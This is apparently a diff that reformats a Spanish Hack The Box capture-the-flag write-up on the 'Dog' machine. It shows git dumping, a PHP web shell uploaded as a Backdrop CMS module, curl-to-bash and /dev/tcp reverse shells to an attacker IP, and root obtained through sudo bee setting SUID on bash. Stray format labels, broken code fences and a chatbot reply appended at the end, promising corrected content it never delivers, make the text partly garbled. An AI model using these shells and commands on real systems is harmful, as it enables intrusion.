@@ -1,23 +1,41 @@
-Dog - Write-up de Hack The Box
-Introducción a la Máquina Dog
-OS: Linux
-Dificultad: Fácil
-Puntos: 20
-Fecha de Lanzamiento: 08 Mar 2025
+---
+layout: ../../layouts/Layout.astro
+title: Dog - Write-up de Hack The Box
+description: Análisis detallado de la máquina Hack The Box 'Dog' (Linux), cubriendo la enumeración de Git, la explotación de Backdrop CMS (CVE-2022-42092) y la escalada de privilegios con 'bee'.
+publishDate: 2025-04-19 # Ensure this is a valid date
+author: Juan Rodriguez
+tags: ["HackTheBox", "Linux", "Nmap", "Git", "Backdrop CMS", "CVE-2022-42092", "PHP RCE", "Reverse Shell", "Privilege Escalation", "Sudo", "bee"] # CRUCIAL
+difficulty: Easy
+machineName: Dog
+coverImage: /cv-juan/projects/dog-htb-cover.png 
+emoji: "🐕" # good for the card
+gradient: "from-purple-500 to-indigo-600" 
+---
 
-Esta máquina, "Dog," es un CTF fácil que involucra la enumeración de un repositorio Git expuesto en un servicio web, la explotación de una vulnerabilidad de carga de archivos arbitrarios en Backdrop CMS, y la escalada de privilegios a través de una entrada sudo mal configurada para la herramienta bee.
+# Dog - Write-up de Hack The Box
 
-1. Escaneo de Puertos (Nmap)
+## Introducción a la Máquina Dog
+
+**OS:** Linux
+**Dificultad:** Fácil
+**Puntos:** 20
+**Fecha de Lanzamiento:** 08 Mar 2025
+
+Esta máquina, "Dog," es un CTF fácil que involucra la enumeración de un repositorio Git expuesto en un servicio web, la explotación de una vulnerabilidad de carga de archivos arbitrarios en Backdrop CMS, y la escalada de privilegios a través de una entrada `sudo` mal configurada para la herramienta `bee`.
+
+---
+
+## 1. Escaneo de Puertos (Nmap)
+
 El primer paso es siempre un escaneo de Nmap para descubrir qué puertos están abiertos y qué servicios se están ejecutando.
 
+```bash
 nmap -sC -sV -oA nmap/dog 10.10.11.58
-
 Resultados del Nmap:
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-
 El escaneo revela que los puertos 22 (SSH) y 80 (HTTP) están abiertos. El puerto 80 es nuestro objetivo principal para la enumeración web.
 
 2. Enumeración Web (HTTP - Apache)
@@ -34,12 +52,15 @@ Descargando el Repositorio Git:
 
 Utilizamos git-dumper para descargar el contenido del repositorio Git expuesto.
 
-git-dumper http://10.10.11.58/.git/ dog_html/
+Bash
 
+git-dumper [http://10.10.11.58/.git/](http://10.10.11.58/.git/) dog_html/
 (Nota: El PDF muestra http://10.10.11.58/.git/dog_htb/ como ejemplo, pero la URL correcta para descargar la raíz del repositorio sería http://10.10.11.58/.git/)
 
 Analizando el Código Fuente - Credenciales de la Base de Datos
 Una vez descargado el repositorio, exploramos los archivos. Encontramos el archivo de configuración de la base de datos: settings.php.
+
+PHP
 
 // File: settings.php
 <?php
@@ -51,22 +72,20 @@ Una vez descargado el repositorio, exploramos los archivos. Encontramos el archi
 // Test sites can configure their database by entering the connection string
 // below. If using replica databases or multiple connections, see the
 // advanced database documentation.
-// https://api.backdropcms.org/database-configuration
+// [https://api.backdropcms.org/database-configuration](https://api.backdropcms.org/database-configuration)
 $database = 'mysql://root:BackDropJ2024052824@127.0.0.1/hackdrop';
 $database_prefix = '';
 ?>
-
 ¡Excelente! Hemos encontrado las credenciales de la base de datos:
 
 Usuario: root
-
 Contraseña: BackDropJ2024052824
-
 Descubrimiento de Nombre de Usuario (tiffany@dog.htb)
 El PDF también menciona buscar el nombre de dominio revelado por Nmap (dog.htb) dentro de la carpeta principal y luego obtener un nombre de usuario. El comando grep sugerido fue:
 
-grep -r "dog.htb" .
+Bash
 
+grep -r "dog.htb" .
 Esto llevó al descubrimiento del usuario tiffany@dog.htb.
 
 3. Acceso al Panel de Administración de Backdrop CMS
@@ -82,9 +101,7 @@ El siguiente paso es buscar vulnerabilidades en Backdrop CMS. Una búsqueda ráp
 Para explotar esto, necesitamos dos archivos:
 
 shell.info: Un archivo de información para el módulo/tema que engaña a CMS.
-
 shell.php: El shell PHP que nos permitirá ejecutar comandos.
-
 Contenido de shell.info:
 
 ; File: shell.info
@@ -101,8 +118,9 @@ configure = admin/structure/block
 project = backdrop
 version = 1.27.1
 timestamp = 1789862662
-
 Contenido de shell.php (shell simple de comando):
+
+PHP
 
 ; File: shell.php
 <html>
@@ -121,24 +139,19 @@ if(isset($_GET['cmd']))
 </pre>
 </body>
 </html>
-
 Pasos de Explotación:
 
 Crear un archivo .tar: Colocamos shell.info y shell.php dentro de una carpeta (ej. shell/) y luego la comprimimos en un archivo .tar (ej. shell.tar).
-
 Cargar el archivo: Navegamos a la sección de carga de módulos/temas en Backdrop CMS.
-
 URL: http://10.10.11.58/admin/modules/install (o similar, en el menú Configuration -> Install projects).
-
 Subimos shell.tar a través de la opción "Upload a module, theme, or layout archive to install".
-
 Confirmar Carga: El CMS reportará "Installation was completed successfully".
-
 Encontrar el Shell Cargado
 Después de la carga, necesitamos encontrar dónde se guardó el shell. El PDF indica que se realizó un "fuzzing" (enumeración de directorios/archivos) con Gobuster.
 
-gobuster dir -u http://10.10.11.58/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+Bash
 
+gobuster dir -u [http://10.10.11.58/](http://10.10.11.58/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
 El fuzzing reveló el directorio modules/, y dentro de él, pudimos acceder a nuestro shell:
 
 URL del Shell: http://10.10.11.58/modules/shell/shell.php
@@ -153,51 +166,54 @@ La máquina "Dog" tiene un script que borra los archivos cargados, por lo que un
 En la máquina del atacante (Kali/Parrot):
 
 Inicia un oyente de Netcat:
+Bash
 
 nc -lvnp 4444
-
 Inicia un servidor HTTP simple para servir el script de reverse shell:
+Bash
 
 python3 -m http.server 5555
-
 Desde el shell web en Dog:
 
 Descargamos y ejecutamos un script de reverse shell. En este caso, usamos curl para descargar un script bash y ejecutarlo. El script bash contiene la siguiente línea:
+Bash
 
 bash -i & /dev/tcp/10.10.14.40/4444 0>&1
-
 Donde 10.10.14.40 es la IP de tu máquina de atacante.
-
 Comando en el shell web:
+Bash
 
 curl 10.10.14.40:5555 | bash
-
 O directamente:
+Bash
 
 bash -c "bash -i >& /dev/tcp/10.10.14.40/4444 0>&1"
-
 ¡Recibimos una shell de www-data en nuestro oyente de Netcat!
 
 5. Escalada de Privilegios
 Una vez como www-data, enumeramos los usuarios en el sistema.
 
+Bash
+
 www-data@dog:/var/www/html/modules/shell$ ls -l /home
 total 8
 drwxr-xr-x 2 jobert jobert 4096 Apr 20 2025 jobert
 drwxr-xr-x 2 johncusack johncusack 4096 Apr 20 2025 johncusack
-
 Encontramos los usuarios jobert y johncusack.
 
 Recordando la contraseña BackDropJ2024052824 que encontramos para root de la base de datos, intentamos usarla para su a johncusack.
 
+Bash
+
 www-data@dog:/home$ su johncusack
 Password: BackDropJ2024052824
 johncusack@dog:/home$
-
 ¡Éxito! Hemos cambiado al usuario johncusack.
 
 Escalada a Root con sudo y bee
 Como johncusack, verificamos los permisos de sudo:
+
+Bash
 
 johncusack@dog:~$ sudo -l
 [sudo] password for johncusack: BackDropJ2024052824
@@ -213,36 +229,42 @@ La herramienta `bee` es un ejecutable para Backdrop CMS que permite evaluar cód
 ```bash
 johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("whoami")'
 root
-
 ¡Bingo! Hemos ejecutado whoami como root.
 
 Para obtener una shell de root persistente, podemos usar bee para establecer el bit SUID en /bin/bash. El bit SUID permite que un ejecutable se ejecute con los permisos del propietario del archivo (en este caso, root), en lugar del usuario que lo ejecuta.
 
+Bash
+
 johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("chmod u+s /bin/bash")'
 johncusack@dog:~$ ls -l /bin/bash
 -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash
-
 El s en los permisos (-rwsr-xr-x) confirma que el bit SUID está configurado.
 
 Ahora, simplemente ejecutamos bash -p (donde -p le dice a bash que use los permisos efectivos del archivo, es decir, root).
 
+Bash
+
 johncusack@dog:~$ bash -p
 bash-5.0# whoami
 root
-
 ¡Somos root!
 
 Conclusión
 La máquina "Dog" fue un excelente CTF que abarcó una variedad de vectores de ataque:
 
 Información Sensible Expuesta: Enumeración de un repositorio Git para encontrar credenciales.
-
 Vulnerabilidad en Aplicación Web: Explotación de RCE en Backdrop CMS (CVE-2022-42092) a través de la carga de archivos.
-
 Gestión de Shell: Obtención y persistencia de una reverse shell a pesar de la eliminación de archivos.
-
 Escalada de Privilegios: Uso de credenciales reutilizadas y un permiso sudo mal configurado para bee para obtener acceso root.
-
 Esta máquina resalta la importancia de la higiene del código, la gestión de la configuración (especialmente de los permisos de sudo) y el monitoreo de vulnerabilidades en aplicaciones web.
 
 Descargo de responsabilidad: Este write-up se proporciona únicamente con fines educativos y de concienciación sobre ciberseguridad. Cualquier intento de replicar estas técnicas en sistemas sin autorización expresa es ilegal y poco ético. Realice pruebas de penetración solo en entornos controlados y con el permiso adecuado.
+
+You are absolutely correct! My apologies. The `---` delimiters for the frontmatter were not at the very beginning and end of the frontmatter block, causing Astro not to parse them correctly. This is a common and subtle mistake in Markdown with frontmatter.
+
+The leading `##` before `layout:` and `title:` also need to be removed as they are not part of the frontmatter syntax.
+
+Here is the **corrected and complete content** for your `src/pages/projects/HTB-Dog.md` file. Please replace the *entire content* of that file with this:
+
+
+http://googleusercontent.com/immersive_entry_chip/0
